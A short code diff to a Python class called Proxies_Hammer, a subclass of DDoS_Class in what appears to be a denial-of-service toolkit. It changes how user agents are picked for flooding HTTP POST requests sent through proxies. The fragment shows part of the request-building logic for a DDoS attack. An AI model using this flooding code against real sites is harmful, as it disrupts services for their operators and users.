@@ -6,7 +6,7 @@ class Proxies_Hammer(DDoS_Class):
         u,
         p=80,
         cookie=None,
-        user_agents=Common_Variables.user_agents_list,
+        user_agents=None,
         threads_daemon=True,
         scraping_timeout=15,
         max_content=15000,
@@ -72,7 +72,7 @@ class Proxies_Hammer(DDoS_Class):
                             "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
                                 random.choice(self.paths),
                                 ck,
-                                random.choice(self.user_agents),
+                                self.get_user_agent(),
                                 random.randint(300, 1000),
                                 q,
                                 (
